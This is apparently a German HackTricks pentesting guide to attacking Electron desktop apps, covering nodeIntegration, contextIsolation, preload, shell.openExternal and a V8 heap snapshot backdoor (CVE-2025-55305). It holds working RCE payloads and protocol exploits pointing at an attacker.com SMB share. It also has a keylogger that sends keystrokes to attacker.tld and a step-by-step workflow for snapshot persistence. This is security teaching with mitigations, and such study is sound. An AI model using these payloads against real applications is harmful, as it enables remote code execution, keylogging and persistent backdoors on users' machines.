# Electron Desktop-Apps

{{#include ../../../banners/hacktricks-training.md}}

## Einführung

Electron kombiniert ein lokales Backend (mit **NodeJS**) und ein Frontend (**Chromium**), obwohl es einige der Sicherheitsmechanismen moderner Browser vermissen lässt.

Normalerweise findet man den Electron-App-Code innerhalb einer `.asar`-Anwendung; um den Code zu erhalten, muss man ihn extrahieren:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Im Quellcode einer Electron-App findest du in `packet.json` die Angabe zur `main.js`, in der Sicherheitskonfigurationen festgelegt sind.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron hat 2 Prozesstypen:

- Hauptprozess (hat vollständigen Zugriff auf NodeJS)
- Renderer-Prozess (sollte aus Sicherheitsgründen nur eingeschränkten Zugriff auf NodeJS haben)

![](<../../../images/image (182).png>)

Ein **Renderer-Prozess** ist ein Browserfenster, das eine Datei lädt:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Einstellungen des **Renderer-Prozesses** können im **Hauptprozess** in der Datei main.js **konfiguriert** werden. Einige dieser Konfigurationen können verhindern, dass die Electron-Anwendung RCE oder andere Schwachstellen erhält, wenn die **Einstellungen korrekt konfiguriert** sind.

Die Electron-Anwendung **kann über Node-APIs auf das Gerät zugreifen**, obwohl dies so konfiguriert werden kann, dass es verhindert wird:

- **`nodeIntegration`** - ist `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - ist `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ist off by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- ist `off` by default.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Beispielkonfiguration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Einige **RCE payloads** aus [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Datenverkehr erfassen

Ändere die start-main-Konfiguration und füge die Verwendung eines Proxys wie folgt hinzu:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Wenn Sie eine Electron App lokal ausführen können, ist es möglich, dass Sie sie dazu bringen, beliebigen javascript-Code auszuführen. Siehe dazu in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Wenn die **nodeIntegration** auf **on** gesetzt ist, kann das JavaScript einer Webseite Node.js-Funktionen einfach durch Aufruf von `require()` verwenden. Zum Beispiel sieht die Ausführung der calc-Anwendung unter Windows so aus:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Das in dieser Einstellung angegebene Skript wird **vor anderen Skripten im Renderer geladen**, sodass es **uneingeschränkten Zugriff auf Node APIs** hat:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Daher kann das Skript node-features in Seiten exportieren:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **If `contextIsolation` is on, this won't work**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ führt die **getrennten Kontexte zwischen den Skripten der Webseite und dem internen JavaScript-Code von Electron** ein, sodass die JavaScript-Ausführung des jeweiligen Codes einander nicht beeinflusst. Dies ist eine notwendige Funktion, um die Möglichkeit von RCE auszuschließen.

Wenn die Kontexte nicht isoliert sind, kann ein Angreifer:

1. **Beliebigen JavaScript-Code im Renderer ausführen** (XSS oder Navigation zu externen Seiten)
2. **Eingebaute Methoden überschreiben**, die im preload oder im internen Electron-Code verwendet werden, um die Funktion zu übernehmen
3. **Auslösen** der Verwendung der **überschriebenen Funktion**
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Click-Event umgehen

Wenn beim Klicken auf einen Link Beschränkungen angewendet werden, könntest du diese möglicherweise umgehen, indem du statt eines normalen linken Klicks **einen Mittelklick ausführst**.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Weitere Informationen zu diesen Beispielen findest du unter [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) und [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Beim Deployen einer Electron Desktop-Anwendung ist es entscheidend, die korrekten Einstellungen für `nodeIntegration` und `contextIsolation` vorzunehmen. Es ist etabliert, dass **client-side remote code execution (RCE)**, die auf preload scripts oder Electron's native code aus dem main process abzielt, mit diesen Einstellungen effektiv verhindert wird.

Wenn ein Benutzer mit Links interagiert oder neue Fenster öffnet, werden bestimmte event listeners ausgelöst, die für die Sicherheit und Funktionalität der Anwendung entscheidend sind:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Diese Listener werden von der Desktop-Anwendung **überschrieben**, um ihre eigene **Geschäftslogik** zu implementieren. Die Anwendung prüft, ob ein navigierter Link intern oder in einem externen Webbrowser geöffnet werden soll. Diese Entscheidung wird typischerweise durch eine Funktion, `openInternally`, getroffen. Wenn diese Funktion `false` zurückgibt, bedeutet das, dass der Link extern geöffnet werden soll, indem die Funktion `shell.openExternal` verwendet wird.

**Hier ist ein vereinfachter Pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS Security-Best-Practices raten davon ab, nicht vertrauenswürdige Inhalte mit der Funktion `openExternal` zu akzeptieren, da dies zu RCE über verschiedene Protokolle führen kann. Betriebssysteme unterstützen unterschiedliche Protokolle, die RCE auslösen könnten. Für detaillierte Beispiele und weiterführende Erklärungen zu diesem Thema kann auf [this resource](https://positive.security/blog/url-open-rce#windows-10-19042) verwiesen werden, das Windows-Protokollbeispiele enthält, mit denen diese Verwundbarkeit ausgenutzt werden kann.

In macos kann die Funktion `openExternal` ausgenutzt werden, um beliebige Befehle auszuführen, z. B. `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Beispiele für Windows-Protokoll-Exploits sind:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + verwundbare preload IPC + shell.openExternal

Diese Schwachstelle ist in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** zu finden.

Die **webviewTag** ist eine **veraltete Funktion**, die die Verwendung von **NodeJS** im **renderer process** ermöglicht. Sie sollte deaktiviert werden, da dadurch ein Script im preload-Kontext geladen werden kann, z. B.:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Daher könnte ein Angreifer, dem es gelingt, eine beliebige Seite zu laden, dieses Tag verwenden, um **ein beliebiges preload script zu laden**.

Dieses preload script wurde dann ausgenutzt, um einen **verwundbaren IPC service (`skype-new-window`)** aufzurufen, der **`shell.openExternal`** aufrief, um RCE zu erlangen:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Interne Dateien lesen: XSS + contextIsolation

**Das Deaktivieren von `contextIsolation` ermöglicht die Verwendung von `<webview>`-Tags**, ähnlich wie bei `<iframe>`, zum Lesen und Exfiltrieren lokaler Dateien. Ein Beispiel zeigt, wie diese Schwachstelle ausgenutzt werden kann, um den Inhalt interner Dateien zu lesen:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Außerdem wird eine weitere Methode zum **Lesen einer internen Datei** vorgestellt, die eine kritische lokale Datei-Lese-Schwachstelle in einer Electron desktop app hervorhebt. Dabei wird ein Skript injiziert, um die Anwendung auszunutzen und Daten zu exfiltrieren:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Veraltetes Chromium**

Wenn der **chromium**, den die Anwendung verwendet, **veraltet** ist und es **bekannte** **vulnerabilities** darauf gibt, könnte es möglich sein, diese zu **exploit** und RCE durch eine **XSS** zu erlangen.\
Du kannst ein Beispiel in diesem **writeup** sehen: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Angenommen, du hast eine XSS gefunden, aber du **kannst keine RCE auslösen oder interne Dateien stehlen**, könntest du versuchen, sie zu nutzen, um **credentials via phishing zu stehlen**.

Zuerst musst du wissen, was passiert, wenn du versuchst, eine neue URL zu öffnen, indem du den JS-Code im front-end überprüfst:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Der Aufruf von **`openInternally`** entscheidet, ob der **link** im **desktop window** **opened** wird, da es sich um einen zur Plattform gehörenden link handelt, **oder** ob er im **browser as a 3rd party resource** geöffnet wird.

Falls der von der Funktion verwendete **regex** **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**) ist, könnte ein Angreifer die **XSS** ausnutzen, um **open a new window which** in der Infrastruktur des Angreifers zu platzieren und den Benutzer **asking for credentials** zu fragen:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokoll

Wie in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) erwähnt, haben Seiten, die über **`file://`** ausgeführt werden, einseitigen Zugriff auf jede Datei auf Ihrem Rechner, was bedeutet, dass **XSS-Schwachstellen genutzt werden können, um beliebige Dateien** vom Rechner des Benutzers zu laden. Die Verwendung eines **benutzerdefinierten Protokolls** verhindert solche Probleme, da Sie das Protokoll darauf beschränken können, nur einen bestimmten Satz von Dateien bereitzustellen.

## Remote module

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> Although the **remote** module exposes some APIs from main to renderer processes, it's not straight forward to get RCE just only abusing the components. However, the components might expose sensitive information.

> [!WARNING]
> Viele Apps, die das **remote** module noch verwenden, tun dies so, dass **NodeIntegration aktiviert sein muss** im renderer process, was ein **großes Sicherheitsrisiko** darstellt.

Seit Electron 14 kann das `remote` module in mehreren Schritten aktiviert werden; aus Sicherheits- und Performance-Gründen wird jedoch dringend davon abgeraten, es zu verwenden.

Um es zu aktivieren, muss es zuerst im **main process** aktiviert werden:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Dann kann der Renderer-Prozess Objekte aus dem Modul so importieren:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** weist auf einige interessante **Funktionen** hin, die vom Objekt **`app`** des remote module bereitgestellt werden:

- **`app.relaunch([options])`**
- **Startet** die Anwendung neu, indem die aktuelle Instanz **beendet** und eine neue **gestartet** wird. Nützlich für **App-Updates** oder erhebliche **Zustandsänderungen**.
- **`app.setAppLogsPath([path])`**
- **Legt fest** oder **erstellt** ein Verzeichnis zum Speichern von **App-Logs**. Die Logs können mit **`app.getPath()`** oder **`app.setPath(pathName, newPath)`** **abgerufen** oder **verändert** werden.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registriert** die aktuelle ausführbare Datei als **Standard-Handler** für ein bestimmtes **Protokoll**. Sie können bei Bedarf einen **benutzerdefinierten Pfad** und **Argumente** angeben.
- **`app.setUserTasks(tasks)`**
- **Fügt** Aufgaben zur **Tasks category** in der **Jump List** (unter Windows) hinzu. Jede Aufgabe kann steuern, wie die App **gestartet** wird oder welche **Argumente** übergeben werden.
- **`app.importCertificate(options, callback)`**
- **Importiert** ein **PKCS#12-Zertifikat** in den systemweiten **Zertifikatsspeicher** (nur Linux). Ein **Callback** kann verwendet werden, um das Ergebnis zu verarbeiten.
- **`app.moveToApplicationsFolder([options])`**
- **Verschiebt** die Anwendung in den **Applications folder** (auf macOS). Hilft, eine **standardmäßige Installation** für Mac-Nutzer sicherzustellen.
- **`app.setJumpList(categories)`**
- **Setzt** oder **entfernt** eine **benutzerdefinierte Jump List** unter **Windows**. Sie können **Kategorien** angeben, um zu organisieren, wie Aufgaben dem Benutzer angezeigt werden.
- **`app.setLoginItemSettings(settings)`**
- **Konfiguriert**, welche **ausführbaren Dateien** beim **Anmelden** zusammen mit ihren **Optionen** gestartet werden (nur macOS und Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences Modul

Die **primäre API** zum Zugriff auf Systemeinstellungen und zum **Auslösen von Systemereignissen** in Electron. Methoden wie **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** und **setUserDefault** gehören alle **zu diesem Modul**.

**Beispielverwendung:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Hört** auf **native macOS notifications** über NSDistributedNotificationCenter.
* Vor **macOS Catalina** konnte man **alle** distributed notifications abhören, indem man **nil** an CFNotificationCenterAddObserver übergab.
* Nach **Catalina / Big Sur** können sandboxed Apps weiterhin **vielen Events** (z. B. **screen locks/unlocks**, **volume mounts**, **network activity** usw.) **subscribe**n, indem sie Notifications **by name** registrieren.

### **getUserDefault / setUserDefault**

* **Interagiert** mit **NSUserDefaults**, das **application**- oder **global**-Preferences auf macOS speichert.

* **getUserDefault** kann sensible Informationen **abrufen**, wie z. B. **recent file locations** oder den **geografischen Standort** des Nutzers.

* **setUserDefault** kann diese Preferences **ändern**, was die **Konfiguration** einer App beeinflussen kann.

* In **älteren Electron-Versionen** (vor v8.3.0) war nur die **standard suite** von NSUserDefaults **zugänglich**.

## Shell.showItemInFolder

Diese Funktion zeigt die angegebene Datei im Dateimanager an, der die Datei **automatisch ausführen** könnte.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps sollten eine **Content Security Policy (CSP)** haben, um **XSS attacks** zu **verhindern**. Die **CSP** ist ein **security standard**, der hilft, die **Ausführung** von **untrusted code** im Browser zu **verhindern**.

Sie wird üblicherweise in der **`main.js`**-Datei oder in der **`index.html`**-Vorlage mit der CSP in einem **meta tag** konfiguriert.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

This real-world chain affected Visual Studio Code 1.63 (CVE-2021-43908) and demonstrates how a single markdown-driven XSS in a webview can be escalated to full RCE when CSP, postMessage, and scheme handlers are misconfigured. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: The generated CSP included `style-src 'self' 'unsafe-inline'`, allowing inline/style-based injection in a `vscode-webview://` context. The payload beaconed to `/stealID` to exfiltrate the target webview’s extensionId.
- Constructing target webview URL: Using the leaked ID to build `vscode-webview://<extensionId>/.../<publicUrl>`.
- Second XSS via postMessage trust: The outer webview trusted `window.postMessage` without strict origin/type checks and loaded attacker HTML with `allowScripts: true`.
- Local file loading via scheme/path rewriting: The payload rewrote `file:///...` to `vscode-file://vscode-app/...` and swapped `exploit.md` for `RCE.html`, abusing weak path validation to load a privileged local resource.
- RCE in Node-enabled context: The loaded HTML executed with Node APIs available, yielding OS command execution.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
Weiterführende Lektüre zu postMessage-Vertrauensproblemen:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ist ein Tool, um Fehlkonfigurationen und Sicherheits-Anti-Patterns in Electron-basierten Anwendungen zu identifizieren.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ist ein Open-Source-VS-Code-Plugin für Electron-Anwendungen, das Electronegativity verwendet.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) zum Prüfen auf verwundbare Drittanbieter-Bibliotheken
- [**Electro.ng**](https://electro.ng/): Bezahlpflichtig

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) findest du ein Lab, um anfällige Electron-Apps auszunutzen.

Einige Befehle, die dir im Lab helfen werden:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Lokal backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron und Chromium-basierte Apps deserialisieren beim Start einen vorgefertigten V8 heap snapshot (v8_context_snapshot.bin, und optional browser_v8_context_snapshot.bin), um jede V8 isolate (main, preload, renderer) zu initialisieren. Historisch behandelten Electron’s integrity fuses diese Snapshots nicht als ausführbaren Inhalt, sodass sie sowohl fuse-basierte Integritätsprüfungen als auch betriebssystemseitige Code-Signing-Checks umgingen. Infolgedessen erlaubte das Ersetzen des Snapshots in einer für den Nutzer beschreibbaren Installation eine unauffällige, persistente Code-Ausführung innerhalb der App, ohne die signierten Binaries oder ASAR zu verändern.

Key points
- Integritätslücke: EnableEmbeddedAsarIntegrityValidation und OnlyLoadAppFromAsar validieren App-JavaScript innerhalb des ASAR, decken jedoch keine V8 heap snapshots ab (CVE-2025-55305). Chromium prüft Snapshots ebenfalls nicht auf Integrität.
- Attack preconditions: Lokales Schreibrecht in das Installationsverzeichnis der App. Das ist üblich auf Systemen, auf denen Electron-Apps oder Chromium-Browser unter für den Nutzer beschreibbaren Pfaden installiert sind (z. B. %AppData%\Local unter Windows; /Applications mit Vorbehalten auf macOS).
- Effect: Zuverlässige Ausführung von Angreifer-JavaScript in jeder isolate durch Überschreiben eines häufig verwendeten builtin (ein „gadget“), was Persistenz und Umgehung der Code-Signing-Verifizierung ermöglicht.
- Affected surface: Electron apps (even with fuses enabled) und Chromium-basierte Browser, die Snapshots aus für Nutzer beschreibbaren Speicherorten laden.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (verschiedenen Code in main vs. renderer ausführen)
- Main process detection: Node-only globals like process.pid, process.binding(), or process.dlopen sind im main process isolate vorhanden.
- Browser/renderer detection: Browser-only globals like alert sind verfügbar, wenn im Dokumentkontext ausgeführt.

Beispiel-Gadget, das einmal die main-process Node-Fähigkeiten sondiert
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context Datendiebstahl PoC (z. B. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator-Workflow
1) Schreibe payload.js, das ein häufig verwendetes builtin überschreibt (z. B. Array.isArray) und optional pro isolate verzweigt.
2) Erstelle das Snapshot ohne Chromium-Quellen:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Überschreibe die Snapshot-Datei(en) der Zielanwendung:
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Starte die Anwendung; das Gadget wird ausgeführt, sobald das gewählte builtin verwendet wird.

Hinweise und Überlegungen
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistenz: Das Ersetzen des Snapshots in einer für den Benutzer beschreibbaren Installation übersteht typischerweise App-Neustarts und sieht wie eine signierte, legitime App aus.
- Chromium browsers: Das gleiche Manipulationskonzept gilt für Chrome/Derivate, die in benutzerbeschreibbaren Pfaden installiert sind. Chrome hat andere Integritätsmitigationen, schließt aber physisch-lokale Angriffe explizit aus seinem Threat Model aus.

Erkennung und Gegenmaßnahmen
- Behandle Snapshots als ausführbaren Inhalt und beziehe sie in Integritätsprüfungen ein (CVE-2025-55305 fix).
- Bevorzuge nur für Admins beschreibbare Installationsorte; erstelle Baselines und überwache Hashes für v8_context_snapshot.bin und browser_v8_context_snapshot.bin.
- Erkenne frühes Runtime-Builtin-Überschreiben und unerwartete Snapshot-Änderungen; alarmiere, wenn deserialisierte Snapshots nicht den erwarteten Werten entsprechen.

## **References**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
